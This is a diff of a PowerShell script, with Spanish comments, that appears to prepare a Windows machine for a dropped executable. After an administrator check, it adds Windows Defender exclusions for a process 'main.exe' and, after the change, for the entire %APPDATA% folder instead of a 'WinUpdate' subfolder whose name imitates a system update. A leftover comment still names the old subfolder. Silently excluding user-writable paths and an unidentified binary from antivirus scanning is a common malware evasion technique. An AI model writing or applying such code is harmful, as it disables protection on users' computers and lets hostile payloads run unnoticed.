@@ -8,11 +8,10 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 # Obtener ruta de APPDATA
 $appdata = $env:APPDATA
-$carpetaDestino = Join-Path $appdata "WinUpdate"
-$ejecutable = Join-Path $carpetaDestino "main.exe"
+$ejecutable = Join-Path $appdata "main.exe"
 
 # Agregar exclusión para la carpeta %APPDATA%\WinUpdate
-Add-MpPreference -ExclusionPath $carpetaDestino
+Add-MpPreference -ExclusionPath $appdata
 
 # Agregar exclusión para el ejecutable main.exe
 Add-MpPreference -ExclusionProcess $ejecutable
